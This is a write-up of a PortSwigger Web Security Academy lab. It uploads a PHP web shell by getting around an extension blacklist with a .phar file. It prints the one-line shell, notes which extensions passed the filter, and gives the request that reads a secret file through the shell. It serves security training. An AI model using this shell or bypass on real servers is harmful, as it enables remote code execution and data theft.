# [Web shell upload via extension blacklist bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)

## Steps

- Went to the login page, and logged in with provided credentials from the lab description (wiener:peter).
- On the my account page uploaded simple `image.php` file instead of actual profile image.

![1779138462618](image/01_Remote_code_execution_via_web_shell_upload/1779138462618.png)

`image.php`:

```php
<?php system($_GET['cmd']); ?>
```

- Got response message:

```
Sorry, php files are not allowed Sorry, there was an error uploading your file.
```

- Tried other php extensions alternatives instead of usual `.php`:
  - `.php5` - uploaded it but wasn't executable
  - `.phtml` - was blacklisted
  - `.phar` - uploaded it and was executable

- Opened url `https://0a06005e03c3b3e1811a84c700840047.web-security-academy.net/files/avatars/image.phar?cmd=cat%20/home/carlos/secret` to run the `cat /home/carlos/secret` command and obtain the secret flag.
